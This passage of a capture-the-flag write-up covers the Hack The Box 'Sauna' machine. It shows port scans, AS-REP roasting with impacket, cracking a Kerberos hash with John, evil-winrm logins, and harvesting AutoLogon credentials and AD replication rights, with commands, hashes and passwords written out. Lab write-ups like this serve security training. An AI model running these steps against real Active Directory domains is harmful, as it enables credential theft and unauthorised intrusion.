&lt;span class="code-line"&gt;9389/tcp  open  adws&lt;/span&gt;
&lt;span class="code-line"&gt;49667/tcp open  unknown&lt;/span&gt;
&lt;span class="code-line"&gt;49669/tcp open  unknown&lt;/span&gt;
&lt;span class="code-line"&gt;49670/tcp open  unknown&lt;/span&gt;
&lt;span class="code-line"&gt;49671/tcp open  unknown&lt;/span&gt;
&lt;span class="code-line"&gt;49681/tcp open  unknown&lt;/span&gt;
&lt;span class="code-line"&gt;57381/tcp open  unknown&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;# Nmap done at Mon Feb 17 08:43:53 2020 -- 1 IP address (1 host up) scanned in 867.44 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We run a version scan on the open ports. There is a IIS web server on port 80:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Mon Feb 17 08:45:29 2020 as: nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49669,49670,49671,49681,57381 -sSV -oN nmap_ssv 10.10.10.175&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.175&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.31s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;PORT      STATE SERVICE       VERSION&lt;/span&gt;
&lt;span class="code-line"&gt;53/tcp    open  domain?&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp    open  http          Microsoft IIS httpd 10.0&lt;/span&gt;
&lt;span class="code-line"&gt;88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-02-17 21:45:22Z)&lt;/span&gt;
&lt;span class="code-line"&gt;135/tcp   open  msrpc         Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn&lt;/span&gt;
&lt;span class="code-line"&gt;389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)&lt;/span&gt;
&lt;span class="code-line"&gt;445/tcp   open  microsoft-ds?&lt;/span&gt;
&lt;span class="code-line"&gt;464/tcp   open  kpasswd5?&lt;/span&gt;
&lt;span class="code-line"&gt;593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0&lt;/span&gt;
&lt;span class="code-line"&gt;636/tcp   open  tcpwrapped&lt;/span&gt;
&lt;span class="code-line"&gt;3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)&lt;/span&gt;
&lt;span class="code-line"&gt;3269/tcp  open  tcpwrapped&lt;/span&gt;
&lt;span class="code-line"&gt;5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)&lt;/span&gt;
&lt;span class="code-line"&gt;9389/tcp  open  mc-nmf        .NET Message Framing&lt;/span&gt;
&lt;span class="code-line"&gt;49667/tcp open  msrpc         Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;49669/tcp open  msrpc         Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0&lt;/span&gt;
&lt;span class="code-line"&gt;49671/tcp open  msrpc         Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;49681/tcp open  msrpc         Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;57381/tcp open  msrpc         Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :&lt;/span&gt;
&lt;span class="code-line"&gt;SF-Port53-TCP:V=7.80%I=7%D=2/17%Time=5E4A9906%P=x86_64-pc-linux-gnu%r(DNSV&lt;/span&gt;
&lt;span class="code-line"&gt;SF:ersionBindReqTCP,20,&amp;quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\&lt;/span&gt;
&lt;span class="code-line"&gt;SF:x04bind\0\0\x10\0\x03&amp;quot;);&lt;/span&gt;
&lt;span class="code-line"&gt;Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
&lt;span class="code-line"&gt;# Nmap done at Mon Feb 17 08:48:06 2020 -- 1 IP address (1 host up) scanned in 156.46 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="web"&gt;Web&lt;/h2&gt;
&lt;p&gt;The website is about the Egotistical Bank.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Sauna website" src="/media/2020.07/sauna_01.png"&gt;&lt;/p&gt;
&lt;p&gt;The only "interesting" page is the "about" page where we can get a list of the
"amazing" team.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Sauna the &amp;quot;amazing&amp;quot; team" src="/media/2020.07/sauna_02.png"&gt;&lt;/p&gt;
&lt;p&gt;We get the teams members and put them in a file. We try to guess the name
convention use by the company. For instance, for the employee John Doe we try
"john.doe", "jdoe", "jodoe". This give use a list of possible users as the
following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;fergus.smith&lt;/span&gt;
&lt;span class="code-line"&gt;hugo.bear&lt;/span&gt;
&lt;span class="code-line"&gt;steven.kerb&lt;/span&gt;
&lt;span class="code-line"&gt;shaun.coins&lt;/span&gt;
&lt;span class="code-line"&gt;bowie.taylor&lt;/span&gt;
&lt;span class="code-line"&gt;sophie.driver&lt;/span&gt;
&lt;span class="code-line"&gt;fsmith&lt;/span&gt;
&lt;span class="code-line"&gt;hbear&lt;/span&gt;
&lt;span class="code-line"&gt;skerb&lt;/span&gt;
&lt;span class="code-line"&gt;scoins&lt;/span&gt;
&lt;span class="code-line"&gt;btaylor&lt;/span&gt;
&lt;span class="code-line"&gt;sdriver&lt;/span&gt;
&lt;span class="code-line"&gt;fesmith&lt;/span&gt;
&lt;span class="code-line"&gt;hubear&lt;/span&gt;
&lt;span class="code-line"&gt;stkerb&lt;/span&gt;
&lt;span class="code-line"&gt;shcoins&lt;/span&gt;
&lt;span class="code-line"&gt;botaylor&lt;/span&gt;
&lt;span class="code-line"&gt;sodriver&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We launch &lt;a href="https://github.com/SecureAuthCorp/impacket/"&gt;impacket's&lt;/a&gt; script
&lt;code&gt;GetNPUsers.py&lt;/code&gt; against our users list. We get the krb5tgs/Kerberoasting hash of the fsmith
user.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python GetNPUsers.py  -dc-ip 10.10.10.175  egotisticalbank/ -usersfile ~/pentest/htb_sauna/users&lt;/span&gt;
&lt;span class="code-line"&gt;Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)&lt;/span&gt;
&lt;span class="code-line"&gt;[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)&lt;/span&gt;
&lt;span class="code-line"&gt;[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)&lt;/span&gt;
&lt;span class="code-line"&gt;[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)&lt;/span&gt;
&lt;span class="code-line"&gt;[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)&lt;/span&gt;
&lt;span class="code-line"&gt;[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)&lt;/span&gt;
&lt;span class="code-line"&gt;$krb5asrep$23$fsmith@EGOTISTICALBANK:7737b8e55d1ac7976a01e619a1268567$268f28ec59cfeda91a139f8f8c2c5cb9679d0dc04ba133f031b3021ebbd203888cd12633a0e604ad28420ff3fe41694d38f55b434bbe2af2b7ee0958a9a5705e4a880e2ecebb74a4d1aca73371cfcb73fb54a61520392d76079cc32bf3e128b87e3450d68361a84b4c686104e2fe13dc3cd7bd381a5ac87737ab8b95908bf0be409c7642fcfac3599aca04d19fd0f25f7bb4908a6fb496975f68ee3a4761ca406a43502b86410774127f25a5dc14c76dde7ac458df451dbcb093c4c6d069406e98c4839ecd6a0952a0850c289fab93e29682ec64cb690add83d0c6986c8f078bf25e53662f7d7fcc2c1e4740554036218a71320da2067a1298&lt;/span&gt;
&lt;span class="code-line"&gt;[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)&lt;/span&gt;
&lt;span class="code-line"&gt;[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)&lt;/span&gt;
&lt;span class="code-line"&gt;[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)&lt;/span&gt;
&lt;span class="code-line"&gt;[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)&lt;/span&gt;
&lt;span class="code-line"&gt;[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)&lt;/span&gt;
&lt;span class="code-line"&gt;[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)&lt;/span&gt;
&lt;span class="code-line"&gt;[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)&lt;/span&gt;
&lt;span class="code-line"&gt;[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)&lt;/span&gt;
&lt;span class="code-line"&gt;[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)&lt;/span&gt;
&lt;span class="code-line"&gt;[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)&lt;/span&gt;
&lt;span class="code-line"&gt;[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We crack that hash using John and the Rockyou dictionary getting fsmith
password.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;john hash -w=tools/password_lists/rockyou.txt&lt;/span&gt;
&lt;span class="code-line"&gt;Warning: detected hash type &amp;quot;krb5asrep&amp;quot;, but the string is also recognized as &amp;quot;krb5asrep-aes-opencl&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;Use the &amp;quot;--format=krb5asrep-aes-opencl&amp;quot; option to force loading these as that type instead&lt;/span&gt;
&lt;span class="code-line"&gt;Using default input encoding: UTF-8&lt;/span&gt;
&lt;span class="code-line"&gt;Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])&lt;/span&gt;
&lt;span class="code-line"&gt;Will run 4 OpenMP threads&lt;/span&gt;
&lt;span class="code-line"&gt;Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status&lt;/span&gt;
&lt;span class="code-line"&gt;Thestrokes23     ($krb5asrep$23$fsmith@EGOTISTICALBANK)&lt;/span&gt;
&lt;span class="code-line"&gt;1g 0:00:00:19 DONE (2020-02-17 15:33) 0.05235g/s 551780p/s 551780c/s 551780C/s Thines..Thehulk2008&lt;/span&gt;
&lt;span class="code-line"&gt;Use the &amp;quot;--show&amp;quot; option to display all of the cracked passwords reliably&lt;/span&gt;
&lt;span class="code-line"&gt;Session completed&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We connect on the box with our fsmith account using
&lt;a href="https://github.com/Hackplayers/evil-winrm"&gt;evil-winrm&lt;/a&gt;. And get the user flag
on his desktop.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ruby evil-winrm.rb -u fsmith -i 10.10.10.175 -p &amp;#39;Thestrokes23&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Evil-WinRM shell v1.8&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Info: Establishing connection to remote endpoint&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:\Users\FSmith\Documents&amp;gt; cat ../Desktop/user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;1b5520b98d97cf17f24122a55baf70cf&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="getting-root"&gt;Getting root&lt;/h1&gt;
&lt;h2 id="getting-svc_loanmgr"&gt;Getting svc_loanmgr&lt;/h2&gt;
&lt;p&gt;We take a look at the other users on the box using &lt;code&gt;net user&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;*Evil-WinRM* PS C:\Users\FSmith\Documents&amp;gt; net user&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;User accounts for \\&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;-------------------------------------------------------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;Administrator            FSmith                   Guest&lt;/span&gt;
&lt;span class="code-line"&gt;HSmith                   krbtgt                   svc_loanmgr&lt;/span&gt;
&lt;span class="code-line"&gt;The command completed with one or more errors.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We upload
&lt;a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite"&gt;winPEAS.exe&lt;/a&gt;
from the Privilege Escalation Awesome Scripts SUITE and run it on the box.&lt;/p&gt;
&lt;p&gt;It found some AutoLogon credetials for the account &lt;code&gt;svc_loanmgr&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;[+] Looking for AutoLogon credentials(T1012)&lt;/span&gt;
&lt;span class="code-line"&gt;  Some AutoLogon credentials were found!!&lt;/span&gt;
&lt;span class="code-line"&gt;      DefaultDomainName             :  EGOTISTICALBANK&lt;/span&gt;
&lt;span class="code-line"&gt;      DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager&lt;/span&gt;
&lt;span class="code-line"&gt;      DefaultPassword               :  Moneymakestheworldgoround!&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We connect on the box with the svc_loanmgr account using
&lt;a href="https://github.com/Hackplayers/evil-winrm"&gt;evil-winrm&lt;/a&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ruby evil-winrm.rb -u svc_loanmgr -i 10.10.10.175 -p &amp;#39;Moneymakestheworldgoround!&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Evil-WinRM shell v1.8&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Info: Establishing connection to remote endpoint&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="enumerating-our-users-privileges"&gt;Enumerating our user's privileges&lt;/h2&gt;
&lt;p&gt;We run the &lt;code&gt;whoami /all&lt;/code&gt; command to list our user permissions but there is
nothing interesting here: As the &lt;a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/user-rights-assignment"&gt;Microsoft documentation&lt;/a&gt;
point out all our privileges and group are legitimate.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents&amp;gt; whoami /all&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;USER INFORMATION&lt;/span&gt;
&lt;span class="code-line"&gt;----------------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;User Name                   SID&lt;/span&gt;
&lt;span class="code-line"&gt;=========================== ==============================================&lt;/span&gt;
&lt;span class="code-line"&gt;egotisticalbank\svc_loanmgr S-1-5-21-2966785786-3096785034-1186376766-1108&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;GROUP INFORMATION&lt;/span&gt;
&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;mGroup Name                                  Type             SID          Attributes&lt;/span&gt;
&lt;span class="code-line"&gt;=========================================== ================ ============ ==================================================&lt;/span&gt;
&lt;span class="code-line"&gt;Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group&lt;/span&gt;
&lt;span class="code-line"&gt;BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group&lt;/span&gt;
&lt;span class="code-line"&gt;BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group&lt;/span&gt;
&lt;span class="code-line"&gt;BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group&lt;/span&gt;
&lt;span class="code-line"&gt;nNT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group&lt;/span&gt;
&lt;span class="code-line"&gt;NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group&lt;/span&gt;
&lt;span class="code-line"&gt;NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group&lt;/span&gt;
&lt;span class="code-line"&gt;NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group&lt;/span&gt;
&lt;span class="code-line"&gt;Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;PRIVILEGES INFORMATION&lt;/span&gt;
&lt;span class="code-line"&gt;----------------------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Privilege Name                Description                    State&lt;/span&gt;
&lt;span class="code-line"&gt;============================= ============================== =======&lt;/span&gt;
&lt;span class="code-line"&gt;SeMachineAccountPrivilege     Add workstations to domain     Enabled&lt;/span&gt;
&lt;span class="code-line"&gt;SeChangeNotifyPrivilege       Bypass traverse checking       Enabled&lt;/span&gt;
&lt;span class="code-line"&gt;SeIncreaseWorkingSetPrivilege Increase a process working set Enabled&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;USER CLAIMS INFORMATION&lt;/span&gt;
&lt;span class="code-line"&gt;-----------------------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;User claims unknown.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Kerberos support for Dynamic Access Control on this device has been disabled.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents&amp;gt; WHOAMI /PRIV&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;PRIVILEGES INFORMATION&lt;/span&gt;
&lt;span class="code-line"&gt;----------------------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Privilege Name                Description                    State&lt;/span&gt;
&lt;span class="code-line"&gt;============================= ============================== =======&lt;/span&gt;
&lt;span class="code-line"&gt;SeMachineAccountPrivilege     Add workstations to domain     Enabled&lt;/span&gt;
&lt;span class="code-line"&gt;SeChangeNotifyPrivilege       Bypass traverse checking       Enabled&lt;/span&gt;
&lt;span class="code-line"&gt;SeIncreaseWorkingSetPrivilege Increase a process working set Enabled&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="getting-ad-privileges"&gt;Getting AD privileges&lt;/h2&gt;
&lt;p&gt;We need to list our AD privileges.
We upload &lt;a href="https://github.com/sense-of-security/ADRecon"&gt;ADRecon&lt;/a&gt; powershell
script on the box, run it and download the results.&lt;/p&gt;
&lt;p&gt;(for more information about AD attacks: &lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md"&gt;payloadallthethings&lt;/a&gt;.)&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents&amp;gt; upload /root/pentest/ADRecon.ps1 .\&lt;/span&gt;
&lt;span class="code-line"&gt;Info: Uploading /root/pentest/ADRecon.ps1 to .\&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Data: 835464 bytes of 835464 bytes copied&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Info: Upload successful!&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents&amp;gt; .\ADRecon.ps1&lt;/span&gt;
&lt;span class="code-line"&gt;[*] ADRecon v1.1 by Prashant Mahajan (@prashant3535)&lt;/span&gt;
&lt;span class="code-line"&gt;Access denied&lt;/span&gt;
&lt;span class="code-line"&gt;At C:\Users\svc_loanmgr\Documents\ADRecon.ps1:11249 char:25&lt;/span&gt;
&lt;span class="code-line"&gt;+ ...           $computer = Get-CimInstance -ClassName Win32_ComputerSystem&lt;/span&gt;
&lt;span class="code-line"&gt;+                           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~&lt;/span&gt;
&lt;span class="code-line"&gt;    + CategoryInfo          : PermissionDenied: (root\cimv2:Win32_ComputerSystem:String) [Get-CimInstance], CimException&lt;/span&gt;
&lt;span class="code-line"&gt;    + FullyQualifiedErrorId : HRESULT 0x80041003,Microsoft.Management.Infrastructure.CimCmdlets.GetCimInstanceCommand&lt;/span&gt;
&lt;span class="code-line"&gt;Computer Role could not be identified.&lt;/span&gt;
&lt;span class="code-line"&gt;Cannot find a variable with the name &amp;#39;computerrole&amp;#39;.&lt;/span&gt;
&lt;span class="code-line"&gt;At C:\Users\svc_loanmgr\Documents\ADRecon.ps1:11292 char:5&lt;/span&gt;
&lt;span class="code-line"&gt;+     Remove-Variable computerrole&lt;/span&gt;
&lt;span class="code-line"&gt;+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~&lt;/span&gt;
&lt;span class="code-line"&gt;    + CategoryInfo          : ObjectNotFound: (computerrole:String) [Remove-Variable], ItemNotFoundException&lt;/span&gt;
&lt;span class="code-line"&gt;    + FullyQualifiedErrorId : VariableNotFound,Microsoft.PowerShell.Commands.RemoveVariableCommand&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Running on \SAUNA -&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Commencing - 02/19/2020 15:41:03&lt;/span&gt;
&lt;span class="code-line"&gt;[-] Domain&lt;/span&gt;
&lt;span class="code-line"&gt;[-] Forest&lt;/span&gt;
&lt;span class="code-line"&gt;[-] Trusts&lt;/span&gt;
&lt;span class="code-line"&gt;[-] Sites&lt;/span&gt;
&lt;span class="code-line"&gt;[-] Subnets&lt;/span&gt;
&lt;span class="code-line"&gt;[-] Default Password Policy&lt;/span&gt;
&lt;span class="code-line"&gt;[-] Fine Grained Password Policy - May need a Privileged Account&lt;/span&gt;
&lt;span class="code-line"&gt;[-] Domain Controllers&lt;/span&gt;
&lt;span class="code-line"&gt;[-] Users - May take some time&lt;/span&gt;
&lt;span class="code-line"&gt;[-] User SPNs&lt;/span&gt;
&lt;span class="code-line"&gt;[-] PasswordAttributes - Experimental&lt;/span&gt;
&lt;span class="code-line"&gt;[-] Groups - May take some time&lt;/span&gt;
&lt;span class="code-line"&gt;[-] Group Memberships - May take some time&lt;/span&gt;
&lt;span class="code-line"&gt;[-] OrganizationalUnits (OUs)&lt;/span&gt;
&lt;span class="code-line"&gt;[-] GPOs&lt;/span&gt;
&lt;span class="code-line"&gt;[-] gPLinks - Scope of Management (SOM)&lt;/span&gt;
&lt;span class="code-line"&gt;[-] DNS Zones and Records&lt;/span&gt;
&lt;span class="code-line"&gt;[-] Printers&lt;/span&gt;
&lt;span class="code-line"&gt;[-] Computers - May take some time&lt;/span&gt;
&lt;span class="code-line"&gt;[-] Computer SPNs&lt;/span&gt;
&lt;span class="code-line"&gt;[-] LAPS - Needs Privileged Account&lt;/span&gt;
&lt;span class="code-line"&gt;Warning: [*] LAPS is not implemented.&lt;/span&gt;
&lt;span class="code-line"&gt;[-] BitLocker Recovery Keys - Needs Privileged Account&lt;/span&gt;
&lt;span class="code-line"&gt;[-] ACLs - May take some time&lt;/span&gt;
&lt;span class="code-line"&gt;Warning: [*] SACLs - Currently, the module is only supported with LDAP.&lt;/span&gt;
&lt;span class="code-line"&gt;[-] GPOReport - May take some time&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Total Execution Time (mins): 0.69&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Output Directory: C:\Users\svc_loanmgr\Documents\ADRecon-Report-20200219154103&lt;/span&gt;
&lt;span class="code-line"&gt;Warning: [Get-ADRExcelComObj] Excel does not appear to be installed. Skipping generation of ADRecon-Report.xlsx. Use the -GenExcel parameter to generate the ADRecon-Report.xslx on a host with Microsoft Excel installed.&lt;/span&gt;
&lt;span class="code-line"&gt;*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents&amp;gt; download ADRecon-Report-20200219154103 /tmp/adrecon&lt;/span&gt;
&lt;span class="code-line"&gt;Info: Downloading ADRecon-Report-20200219154103 to /tmp/adrecon&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Info: Download successful!&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We look at our user permissions and found that it has the AD privilege
&lt;a href="https://docs.microsoft.com/en-us/windows/win32/adschema/r-ds-replication-get-changes"&gt;DS-Replication-Get-Changes&lt;/a&gt;
which allows to replicate changes from a given NC.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;grep svc CSV-Files/*&lt;/span&gt;
&lt;span class="code-line"&gt;CSV-Files/AboutADRecon.csv:&amp;quot;Ran as user&amp;quot;,&amp;quot;svc_loanmgr&amp;quot;&lt;/span&gt;
